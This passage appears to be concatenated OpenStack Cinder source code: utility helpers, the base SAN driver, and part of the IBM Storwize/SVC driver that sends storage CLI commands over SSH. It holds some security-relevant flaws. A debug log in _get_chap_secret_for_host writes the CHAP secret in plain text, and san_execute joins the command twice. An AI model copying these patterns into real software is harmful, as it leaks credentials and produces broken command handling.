    """"""Temporarily set the attr on a particular object to a given value then
    revert when finished.

    One use of this is to temporarily set the read_deleted flag on a context
    object:

        with temporary_mutation(context, read_deleted=""yes""):
            do_something_that_needed_deleted_objects()
    """"""
    NOT_PRESENT = object()

    old_values = {}
    for attr, new_value in kwargs.items():
        old_values[attr] = getattr(obj, attr, NOT_PRESENT)
        setattr(obj, attr, new_value)

    try:
        yield
    finally:
        for attr, old_value in old_values.items():
            if old_value is NOT_PRESENT:
                del obj[attr]
            else:
                setattr(obj, attr, old_value)


def service_is_up(service):
    """"""Check whether a service is up based on last heartbeat.""""""
    last_heartbeat = service['updated_at'] or service['created_at']
    # Timestamps in DB are UTC.
    elapsed = total_seconds(timeutils.utcnow() - last_heartbeat)
    return abs(elapsed) <= CONF.service_down_time


def generate_mac_address():
    """"""Generate an Ethernet MAC address.""""""
    # NOTE(vish): We would prefer to use 0xfe here to ensure that linux
    #             bridge mac addresses don't change, but it appears to
    #             conflict with libvirt, so we use the next highest octet
    #             that has the unicast and locally administered bits set
    #             properly: 0xfa.
    #             Discussion: https://bugs.launchpad.net/cinder/+bug/921838
    mac = [0xfa, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: ""%02x"" % x, mac))


def read_file_as_root(file_path):
    """"""Secure helper to read file as root.""""""
    try:
        out, _err = execute('cat', file_path, run_as_root=True)
        return out
    except exception.ProcessExecutionError:
        raise exception.FileNotFound(file_path=file_path)


@contextlib.contextmanager
def temporary_chown(path, owner_uid=None):
    """"""Temporarily chown a path.

    :params owner_uid: UID of temporary owner (defaults to current user)
    """"""
    if owner_uid is None:
        owner_uid = os.getuid()

    orig_uid = os.stat(path).st_uid

    if orig_uid != owner_uid:
        execute('chown', owner_uid, path, run_as_root=True)
    try:
        yield
    finally:
        if orig_uid != owner_uid:
            execute('chown', orig_uid, path, run_as_root=True)


@contextlib.contextmanager
def tempdir(**kwargs):
    tmpdir = tempfile.mkdtemp(**kwargs)
    try:
        yield tmpdir
    finally:
        try:
            shutil.rmtree(tmpdir)
        except OSError as e:
            LOG.debug(_('Could not remove tmpdir: %s'), str(e))


def strcmp_const_time(s1, s2):
    """"""Constant-time string comparison.

    :params s1: the first string
    :params s2: the second string

    :return: True if the strings are equal.

    This function takes two strings and compares them.  It is intended to be
    used when doing a comparison for authentication purposes to help guard
    against timing attacks.
    """"""
    if len(s1) != len(s2):
        return False
    result = 0
    for (a, b) in zip(s1, s2):
        result |= ord(a) ^ ord(b)
    return result == 0


def walk_class_hierarchy(clazz, encountered=None):
    """"""Walk class hierarchy, yielding most derived classes first""""""
    if not encountered:
        encountered = []
    for subclass in clazz.__subclasses__():
        if subclass not in encountered:
            encountered.append(subclass)
            # drill down to leaves first
            for subsubclass in walk_class_hierarchy(subclass, encountered):
                yield subsubclass
            yield subclass


class UndoManager(object):
    """"""Provides a mechanism to facilitate rolling back a series of actions
    when an exception is raised.
    """"""
    def __init__(self):
        self.undo_stack = []

    def undo_with(self, undo_func):
        self.undo_stack.append(undo_func)

    def _rollback(self):
        for undo_func in reversed(self.undo_stack):
            undo_func()

    def rollback_and_reraise(self, msg=None, **kwargs):
        """"""Rollback a series of actions then re-raise the exception.

        .. note:: (sirp) This should only be called within an
                  exception handler.
        """"""
        with excutils.save_and_reraise_exception():
            if msg:
                LOG.exception(msg, **kwargs)

            self._rollback()
/n/n/ncinder/volume/drivers/san/san.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
""""""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help=""SSH connection timeout in seconds""),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """"""Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """"""

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, cmd_list, check_exit_code=True, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="""",
                        stderr=""Error running SSH command"",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running SSH command: %s"") % command)

    def ensure_export(self, context, volume):
        """"""Synchronously recreates an export for a logical volume.""""""
        pass

    def create_export(self, context, volume):
        """"""Exports the volume.""""""
        pass

    def remove_export(self, context, volume):
        """"""Removes an export for a logical volume.""""""
        pass

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_(""san_ip must be set""))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return ""%s%s"" % (self.configuration.iscsi_target_prefix,
                         volume['name'])
/n/n/ncinder/volume/drivers/storwize_svc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2013 IBM Corp.
# Copyright 2012 OpenStack LLC.
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
# Authors:
#   Ronen Kat <ronenkat@il.ibm.com>
#   Avishay Traeger <avishay@il.ibm.com>

""""""
Volume driver for IBM Storwize family and SVC storage systems.

Notes:
1. If you specify both a password and a key file, this driver will use the
   key file only.
2. When using a key file for authentication, it is up to the user or
   system administrator to store the private key in a safe manner.
3. The defaults for creating volumes are ""-rsize 2% -autoexpand
   -grainsize 256 -warning 0"".  These can be changed in the configuration
   file or by using volume types(recommended only for advanced users).

Limitations:
1. The driver expects CLI output in English, error messages may be in a
   localized format.
2. Clones and creating volumes from snapshots, where the source and target
   are of different sizes, is not supported.

""""""

import random
import re
import string
import time

from oslo.config import cfg

from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import strutils
from cinder import utils
from cinder.volume.drivers.san import san
from cinder.volume import volume_types

VERSION = 1.1
LOG = logging.getLogger(__name__)

storwize_svc_opts = [
    cfg.StrOpt('storwize_svc_volpool_name',
               default='volpool',
               help='Storage system storage pool for volumes'),
    cfg.IntOpt('storwize_svc_vol_rsize',
               default=2,
               help='Storage system space-efficiency parameter for volumes '
                    '(percentage)'),
    cfg.IntOpt('storwize_svc_vol_warning',
               default=0,
               help='Storage system threshold for volume capacity warnings '
                    '(percentage)'),
    cfg.BoolOpt('storwize_svc_vol_autoexpand',
                default=True,
                help='Storage system autoexpand parameter for volumes '
                     '(True/False)'),
    cfg.IntOpt('storwize_svc_vol_grainsize',
               default=256,
               help='Storage system grain size parameter for volumes '
                    '(32/64/128/256)'),
    cfg.BoolOpt('storwize_svc_vol_compression',
                default=False,
                help='Storage system compression option for volumes'),
    cfg.BoolOpt('storwize_svc_vol_easytier',
                default=True,
                help='Enable Easy Tier for volumes'),
    cfg.IntOpt('storwize_svc_flashcopy_timeout',
               default=120,
               help='Maximum number of seconds to wait for FlashCopy to be '
                    'prepared. Maximum value is 600 seconds (10 minutes).'),
    cfg.StrOpt('storwize_svc_connection_protocol',
               default='iSCSI',
               help='Connection protocol (iSCSI/FC)'),
    cfg.BoolOpt('storwize_svc_multipath_enabled',
                default=False,
                help='Connect with multipath (currently FC-only)'),
    cfg.BoolOpt('storwize_svc_multihostmap_enabled',
                default=True,
                help='Allows vdisk to multi host mapping'),
]


CONF = cfg.CONF
CONF.register_opts(storwize_svc_opts)


class StorwizeSVCDriver(san.SanDriver):
    """"""IBM Storwize V7000 and SVC iSCSI/FC volume driver.

    Version history:
    1.0 - Initial driver
    1.1 - FC support, create_cloned_volume, volume type support,
          get_volume_stats, minor bug fixes

    """"""

    """"""=====================================================================""""""
    """""" SETUP                                                               """"""
    """"""=====================================================================""""""

    def __init__(self, *args, **kwargs):
        super(StorwizeSVCDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(storwize_svc_opts)
        self._storage_nodes = {}
        self._enabled_protocols = set()
        self._compression_enabled = False
        self._context = None

        # Build cleanup translation tables for host names
        invalid_ch_in_host = ''
        for num in range(0, 128):
            ch = str(chr(num))
            if (not ch.isalnum() and ch != ' ' and ch != '.'
                    and ch != '-' and ch != '_'):
                invalid_ch_in_host = invalid_ch_in_host + ch
        self._string_host_name_filter = string.maketrans(
            invalid_ch_in_host, '-' * len(invalid_ch_in_host))

        self._unicode_host_name_filter = dict((ord(unicode(char)), u'-')
                                              for char in invalid_ch_in_host)

    def _get_iscsi_ip_addrs(self):
        generator = self._port_conf_generator(['svcinfo', 'lsportip'])
        header = next(generator, None)
        if not header:
            return

        for port_data in generator:
            try:
                port_node_id = port_data['node_id']
                port_ipv4 = port_data['IP_address']
                port_ipv6 = port_data['IP_address_6']
                state = port_data['state']
            except KeyError:
                self._handle_keyerror('lsportip', header)

            if port_node_id in self._storage_nodes and (
                    state == 'configured' or state == 'online'):
                node = self._storage_nodes[port_node_id]
                if len(port_ipv4):
                    node['ipv4'].append(port_ipv4)
                if len(port_ipv6):
                    node['ipv6'].append(port_ipv6)

    def _get_fc_wwpns(self):
        for key in self._storage_nodes:
            node = self._storage_nodes[key]
            ssh_cmd = ['svcinfo', 'lsnode', '-delim', '!', node['id']]
            raw = self._run_ssh(ssh_cmd)
            resp = CLIResponse(raw, delim='!', with_header=False)
            wwpns = set(node['WWPN'])
            for i, s in resp.select('port_id', 'port_status'):
                if 'unconfigured' != s:
                    wwpns.add(i)
            node['WWPN'] = list(wwpns)
            LOG.info(_('WWPN on node %(node)s: %(wwpn)s')
                     % {'node': node['id'], 'wwpn': node['WWPN']})

    def do_setup(self, ctxt):
        """"""Check that we have all configuration details from the storage.""""""

        LOG.debug(_('enter: do_setup'))
        self._context = ctxt

        # Validate that the pool exists
        ssh_cmd = ['svcinfo', 'lsmdiskgrp', '-delim', '!', '-nohdr']
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return(len(out.strip()), 'do_setup',
                                ssh_cmd, out, err)
        search_text = '!%s!' % self.configuration.storwize_svc_volpool_name
        if search_text not in out:
            raise exception.InvalidInput(
                reason=(_('pool %s doesn\'t exist')
                        % self.configuration.storwize_svc_volpool_name))

        # Check if compression is supported
        self._compression_enabled = False
        try:
            ssh_cmd = ['svcinfo', 'lslicense', '-delim', '!']
            out, err = self._run_ssh(ssh_cmd)
            license_lines = out.strip().split('\n')
            for license_line in license_lines:
                name, foo, value = license_line.partition('!')
                if name in ('license_compression_enclosures',
                            'license_compression_capacity') and value != '0':
                    self._compression_enabled = True
                    break
        except exception.ProcessExecutionError:
            LOG.exception(_('Failed to get license information.'))

        # Get the iSCSI and FC names of the Storwize/SVC nodes
        ssh_cmd = ['svcinfo', 'lsnode', '-delim', '!']
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return(len(out.strip()), 'do_setup',
                                ssh_cmd, out, err)

        nodes = out.strip().split('\n')
        self._assert_ssh_return(len(nodes),
                                'do_setup', ssh_cmd, out, err)
        header = nodes.pop(0)
        for node_line in nodes:
            try:
                node_data = self._get_hdr_dic(header, node_line, '!')
            except exception.VolumeBackendAPIException:
                with excutils.save_and_reraise_exception():
                    self._log_cli_output_error('do_setup',
                                               ssh_cmd, out, err)
            node = {}
            try:
                node['id'] = node_data['id']
                node['name'] = node_data['name']
                node['IO_group'] = node_data['IO_group_id']
                node['iscsi_name'] = node_data['iscsi_name']
                node['WWNN'] = node_data['WWNN']
                node['status'] = node_data['status']
                node['WWPN'] = []
                node['ipv4'] = []
                node['ipv6'] = []
                node['enabled_protocols'] = []
                if node['status'] == 'online':
                    self._storage_nodes[node['id']] = node
            except KeyError:
                self._handle_keyerror('lsnode', header)

        # Get the iSCSI IP addresses and WWPNs of the Storwize/SVC nodes
        self._get_iscsi_ip_addrs()
        self._get_fc_wwpns()

        # For each node, check what connection modes it supports.  Delete any
        # nodes that do not support any types (may be partially configured).
        to_delete = []
        for k, node in self._storage_nodes.iteritems():
            if ((len(node['ipv4']) or len(node['ipv6']))
                    and len(node['iscsi_name'])):
                node['enabled_protocols'].append('iSCSI')
                self._enabled_protocols.add('iSCSI')
            if len(node['WWPN']):
                node['enabled_protocols'].append('FC')
                self._enabled_protocols.add('FC')
            if not len(node['enabled_protocols']):
                to_delete.append(k)

        for delkey in to_delete:
            del self._storage_nodes[delkey]

        # Make sure we have at least one node configured
        self._driver_assert(len(self._storage_nodes),
                            _('do_setup: No configured nodes'))

        LOG.debug(_('leave: do_setup'))

    def _build_default_opts(self):
        # Ignore capitalization
        protocol = self.configuration.storwize_svc_connection_protocol
        if protocol.lower() == 'fc':
            protocol = 'FC'
        elif protocol.lower() == 'iscsi':
            protocol = 'iSCSI'

        opt = {'rsize': self.configuration.storwize_svc_vol_rsize,
               'warning': self.configuration.storwize_svc_vol_warning,
               'autoexpand': self.configuration.storwize_svc_vol_autoexpand,
               'grainsize': self.configuration.storwize_svc_vol_grainsize,
               'compression': self.configuration.storwize_svc_vol_compression,
               'easytier': self.configuration.storwize_svc_vol_easytier,
               'protocol': protocol,
               'multipath': self.configuration.storwize_svc_multipath_enabled}
        return opt

    def check_for_setup_error(self):
        """"""Ensure that the flags are set properly.""""""
        LOG.debug(_('enter: check_for_setup_error'))

        required_flags = ['san_ip', 'san_ssh_port', 'san_login',
                          'storwize_svc_volpool_name']
        for flag in required_flags:
            if not self.configuration.safe_get(flag):
                raise exception.InvalidInput(reason=_('%s is not set') % flag)

        # Ensure that either password or keyfile were set
        if not (self.configuration.san_password or
                self.configuration.san_private_key):
            raise exception.InvalidInput(
                reason=_('Password or SSH private key is required for '
                         'authentication: set either san_password or '
                         'san_private_key option'))

        # Check that flashcopy_timeout is not more than 10 minutes
        flashcopy_timeout = self.configuration.storwize_svc_flashcopy_timeout
        if not (flashcopy_timeout > 0 and flashcopy_timeout <= 600):
            raise exception.InvalidInput(
                reason=_('Illegal value %d specified for '
                         'storwize_svc_flashcopy_timeout: '
                         'valid values are between 0 and 600')
                % flashcopy_timeout)

        opts = self._build_default_opts()
        self._check_vdisk_opts(opts)

        LOG.debug(_('leave: check_for_setup_error'))

    """"""=====================================================================""""""
    """""" INITIALIZE/TERMINATE CONNECTIONS                                    """"""
    """"""=====================================================================""""""

    def ensure_export(self, ctxt, volume):
        """"""Check that the volume exists on the storage.

        The system does not ""export"" volumes as a Linux iSCSI target does,
        and therefore we just check that the volume exists on the storage.
        """"""
        volume_defined = self._is_vdisk_defined(volume['name'])
        if not volume_defined:
            LOG.error(_('ensure_export: Volume %s not found on storage')
                      % volume['name'])

    def create_export(self, ctxt, volume):
        model_update = None
        return model_update

    def remove_export(self, ctxt, volume):
        pass

    def _add_chapsecret_to_host(self, host_name):
        """"""Generate and store a randomly-generated CHAP secret for the host.""""""

        chap_secret = utils.generate_password()
        ssh_cmd = ['svctask', 'chhost', '-chapsecret', chap_secret, host_name]
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from chhost
        self._assert_ssh_return(len(out.strip()) == 0,
                                '_add_chapsecret_to_host', ssh_cmd, out, err)
        return chap_secret

    def _get_chap_secret_for_host(self, host_name):
        """"""Return the CHAP secret for the given host.""""""

        LOG.debug(_('enter: _get_chap_secret_for_host: host name %s')
                  % host_name)

        ssh_cmd = ['svcinfo', 'lsiscsiauth', '-delim', '!']
        out, err = self._run_ssh(ssh_cmd)

        if not len(out.strip()):
            return None

        host_lines = out.strip().split('\n')
        self._assert_ssh_return(len(host_lines), '_get_chap_secret_for_host',
                                ssh_cmd, out, err)

        header = host_lines.pop(0).split('!')
        self._assert_ssh_return('name' in header, '_get_chap_secret_for_host',
                                ssh_cmd, out, err)
        self._assert_ssh_return('iscsi_auth_method' in header,
                                '_get_chap_secret_for_host', ssh_cmd, out, err)
        self._assert_ssh_return('iscsi_chap_secret' in header,
                                '_get_chap_secret_for_host', ssh_cmd, out, err)
        name_index = header.index('name')
        method_index = header.index('iscsi_auth_method')
        secret_index = header.index('iscsi_chap_secret')

        chap_secret = None
        host_found = False
        for line in host_lines:
            info = line.split('!')
            if info[name_index] == host_name:
                host_found = True
                if info[method_index] == 'chap':
                    chap_secret = info[secret_index]

        self._assert_ssh_return(host_found, '_get_chap_secret_for_host',
                                ssh_cmd, out, err)

        LOG.debug(_('leave: _get_chap_secret_for_host: host name '
                    '%(host_name)s with secret %(chap_secret)s')
                  % {'host_name': host_name, 'chap_secret': chap_secret})

        return chap_secret

    def _connector_to_hostname_prefix(self, connector):
        """"""Translate connector info to storage system host name.

        Translate a host's name and IP to the prefix of its hostname on the
        storage subsystem.  We create a host name host name from the host and
        IP address, replacing any invalid characters (at most 55 characters),
        and adding a random 8-character suffix to avoid collisions. The total
        length should be at most 63 characters.

        """"""

        host_name = connector['host']
        if isinstance(host_name, unicode):
            host_name = host_name.translate(self._unicode_host_name_filter)
        elif isinstance(host_name, str):
            host_name = host_name.translate(self._string_host_name_filter)
        else:
            msg = _('_create_host: Cannot clean host name. Host name '
                    'is not unicode or string')
            LOG.error(msg)
            raise exception.NoValidHost(reason=msg)

        host_name = str(host_name)
        return host_name[:55]

    def _find_host_from_wwpn(self, connector):
        for wwpn in connector['wwpns']:
            ssh_cmd = ['svcinfo', 'lsfabric', '-wwpn', wwpn, '-delim', '!']
            out, err = self._run_ssh(ssh_cmd)

            if not len(out.strip()):
                # This WWPN is not in use
                continue

            host_lines = out.strip().split('\n')
            header = host_lines.pop(0).split('!')
            self._assert_ssh_return('remote_wwpn' in header and
                                    'name' in header,
                                    '_find_host_from_wwpn',
                                    ssh_cmd, out, err)
            rmt_wwpn_idx = header.index('remote_wwpn')
            name_idx = header.index('name')

            wwpns = map(lambda x: x.split('!')[rmt_wwpn_idx], host_lines)

            if wwpn in wwpns:
                # All the wwpns will be the mapping for the same
                # host from this WWPN-based query. Just pick
                # the name from first line.
                hostname = host_lines[0].split('!')[name_idx]
                return hostname

        # Didn't find a host
        return None

    def _find_host_exhaustive(self, connector, hosts):
        for host in hosts:
            ssh_cmd = ['svcinfo', 'lshost', '-delim', '!', host]
            out, err = self._run_ssh(ssh_cmd)
            self._assert_ssh_return(len(out.strip()),
                                    '_find_host_exhaustive',
                                    ssh_cmd, out, err)
            for attr_line in out.split('\n'):
                # If '!' not found, return the string and two empty strings
                attr_name, foo, attr_val = attr_line.partition('!')
                if (attr_name == 'iscsi_name' and
                        'initiator' in connector and
                        attr_val == connector['initiator']):
                    return host
                elif (attr_name == 'WWPN' and
                      'wwpns' in connector and
                      attr_val.lower() in
                      map(str.lower, map(str, connector['wwpns']))):
                        return host
        return None

    def _get_host_from_connector(self, connector):
        """"""List the hosts defined in the storage.

        Return the host name with the given connection info, or None if there
        is no host fitting that information.

        """"""

        prefix = self._connector_to_hostname_prefix(connector)
        LOG.debug(_('enter: _get_host_from_connector: prefix %s') % prefix)

        # Get list of host in the storage
        ssh_cmd = ['svcinfo', 'lshost', '-delim', '!']
        out, err = self._run_ssh(ssh_cmd)

        if not len(out.strip()):
            return None

        # If we have FC information, we have a faster lookup option
        hostname = None
        if 'wwpns' in connector:
            hostname = self._find_host_from_wwpn(connector)

        # If we don't have a hostname yet, try the long way
        if not hostname:
            host_lines = out.strip().split('\n')
            self._assert_ssh_return(len(host_lines),
                                    '_get_host_from_connector',
                                    ssh_cmd, out, err)
            header = host_lines.pop(0).split('!')
            self._assert_ssh_return('name' in header,
                                    '_get_host_from_connector',
                                    ssh_cmd, out, err)
            name_index = header.index('name')
            hosts = map(lambda x: x.split('!')[name_index], host_lines)
            hostname = self._find_host_exhaustive(connector, hosts)

        LOG.debug(_('leave: _get_host_from_connector: host %s') % hostname)

        return hostname

    def _create_host(self, connector):
        """"""Create a new host on the storage system.

        We create a host name and associate it with the given connection
        information.

        """"""

        LOG.debug(_('enter: _create_host: host %s') % connector['host'])

        rand_id = str(random.randint(0, 99999999)).zfill(8)
        host_name = '%s-%s' % (self._connector_to_hostname_prefix(connector),
                               rand_id)

        # Get all port information from the connector
        ports = []
        if 'initiator' in connector:
            ports.append('-iscsiname %s' % connector['initiator'])
        if 'wwpns' in connector:
            for wwpn in connector['wwpns']:
                ports.append('-hbawwpn %s' % wwpn)

        # When creating a host, we need one port
        self._driver_assert(len(ports), _('_create_host: No connector ports'))
        port1 = ports.pop(0)
        arg_name, arg_val = port1.split()
        ssh_cmd = ['svctask', 'mkhost', '-force', arg_name, arg_val, '-name',
                   '""%s""' % host_name]
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return('successfully created' in out,
                                '_create_host', ssh_cmd, out, err)

        # Add any additional ports to the host
        for port in ports:
            arg_name, arg_val = port.split()
            ssh_cmd = ['svctask', 'addhostport', '-force', arg_name, arg_val,
                       host_name]
            out, err = self._run_ssh(ssh_cmd)

        LOG.debug(_('leave: _create_host: host %(host)s - %(host_name)s') %
                  {'host': connector['host'], 'host_name': host_name})
        return host_name

    def _get_hostvdisk_mappings(self, host_name):
        """"""Return the defined storage mappings for a host.""""""

        return_data = {}
        ssh_cmd = ['svcinfo', 'lshostvdiskmap', '-delim', '!', host_name]
        out, err = self._run_ssh(ssh_cmd)

        mappings = out.strip().split('\n')
        if len(mappings):
            header = mappings.pop(0)
            for mapping_line in mappings:
                mapping_data = self._get_hdr_dic(header, mapping_line, '!')
                return_data[mapping_data['vdisk_name']] = mapping_data

        return return_data

    def _map_vol_to_host(self, volume_name, host_name):
        """"""Create a mapping between a volume to a host.""""""

        LOG.debug(_('enter: _map_vol_to_host: volume %(volume_name)s to '
                    'host %(host_name)s')
                  % {'volume_name': volume_name, 'host_name': host_name})

        # Check if this volume is already mapped to this host
        mapping_data = self._get_hostvdisk_mappings(host_name)

        mapped_flag = False
        result_lun = '-1'
        if volume_name in mapping_data:
            mapped_flag = True
            result_lun = mapping_data[volume_name]['SCSI_id']
        else:
            lun_used = [int(v['SCSI_id']) for v in mapping_data.values()]
            lun_used.sort()
            # Assume all luns are taken to this point, and then try to find
            # an unused one
            result_lun = str(len(lun_used))
            for index, n in enumerate(lun_used):
                if n > index:
                    result_lun = str(index)
                    break

        # Volume is not mapped to host, create a new LUN
        if not mapped_flag:
            ssh_cmd = ['svctask', 'mkvdiskhostmap', '-host', host_name,
                       '-scsi', result_lun, volume_name]
            out, err = self._run_ssh(ssh_cmd, check_exit_code=False)
            if err and err.startswith('CMMVC6071E'):
                if not self.configuration.storwize_svc_multihostmap_enabled:
                    LOG.error(_('storwize_svc_multihostmap_enabled is set '
                                'to False, Not allow multi host mapping'))
                    exception_msg = 'CMMVC6071E The VDisk-to-host mapping '\
                                    'was not created because the VDisk is '\
                                    'already mapped to a host.\n""'
                    raise exception.CinderException(data=exception_msg)

                for i in range(len(ssh_cmd)):
                    if ssh_cmd[i] == 'mkvdiskhostmap':
                        ssh_cmd.insert(i + 1, '-force')

                # try to map one volume to multiple hosts
                out, err = self._run_ssh(ssh_cmd)
                LOG.warn(_('volume %s mapping to multi host') % volume_name)
                self._assert_ssh_return('successfully created' in out,
                                        '_map_vol_to_host', ssh_cmd, out, err)
            else:
                self._assert_ssh_return('successfully created' in out,
                                        '_map_vol_to_host', ssh_cmd, out, err)
        LOG.debug(_('leave: _map_vol_to_host: LUN %(result_lun)s, volume '
                    '%(volume_name)s, host %(host_name)s') %
                  {'result_lun': result_lun,
                   'volume_name': volume_name,
                   'host_name': host_name})
        return result_lun

    def _delete_host(self, host_name):
        """"""Delete a host on the storage system.""""""

        LOG.debug(_('enter: _delete_host: host %s ') % host_name)

        ssh_cmd = ['svctask', 'rmhost', host_name]
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from rmhost
        self._assert_ssh_return(len(out.strip()) == 0,
                                '_delete_host', ssh_cmd, out, err)

        LOG.debug(_('leave: _delete_host: host %s ') % host_name)

    def _get_conn_fc_wwpns(self, host_name):
        wwpns = []
        cmd = ['svcinfo', 'lsfabric', '-host', host_name]
        generator = self._port_conf_generator(cmd)
        header = next(generator, None)
        if not header:
            return wwpns

        for port_data in generator:
            try:
                wwpns.append(port_data['local_wwpn'])
            except KeyError as e:
                self._handle_keyerror('lsfabric', header)

        return wwpns

    def validate_connector(self, connector):
        """"""Check connector for at least one enabled protocol (iSCSI/FC).""""""
        valid = False
        if 'iSCSI' in self._enabled_protocols and 'initiator' in connector:
            valid = True
        if 'FC' in self._enabled_protocols and 'wwpns' in connector:
            valid = True
        if not valid:
            err_msg = (_('The connector does not contain the required '
                         'information.'))
            LOG.error(err_msg)
            raise exception.VolumeBackendAPIException(data=err_msg)

    def initialize_connection(self, volume, connector):
        """"""Perform the necessary work so that an iSCSI/FC connection can
        be made.

        To be able to create an iSCSI/FC connection from a given host to a
        volume, we must:
        1. Translate the given iSCSI name or WWNN to a host name
        2. Create new host on the storage system if it does not yet exist
        3. Map the volume to the host if it is not already done
        4. Return the connection information for relevant nodes (in the
           proper I/O group)

        """"""

        LOG.debug(_('enter: initialize_connection: volume %(vol)s with '
                    'connector %(conn)s') % {'vol': str(volume),
                                             'conn': str(connector)})

        vol_opts = self._get_vdisk_params(volume['volume_type_id'])
        host_name = connector['host']
        volume_name = volume['name']

        # Check if a host object is defined for this host name
        host_name = self._get_host_from_connector(connector)
        if host_name is None:
            # Host does not exist - add a new host to Storwize/SVC
            host_name = self._create_host(connector)
            # Verify that create_new_host succeeded
            self._driver_assert(
                host_name is not None,
                _('_create_host failed to return the host name.'))

        if vol_opts['protocol'] == 'iSCSI':
            chap_secret = self._get_chap_secret_for_host(host_name)
            if chap_secret is None:
                chap_secret = self._add_chapsecret_to_host(host_name)

        volume_attributes = self._get_vdisk_attributes(volume_name)
        lun_id = self._map_vol_to_host(volume_name, host_name)

        self._driver_assert(volume_attributes is not None,
                            _('initialize_connection: Failed to get attributes'
                              ' for volume %s') % volume_name)

        try:
            preferred_node = volume_attributes['preferred_node_id']
            IO_group = volume_attributes['IO_group_id']
        except KeyError as e:
                LOG.error(_('Did not find expected column name in '
                            'lsvdisk: %s') % str(e))
                exception_msg = (_('initialize_connection: Missing volume '
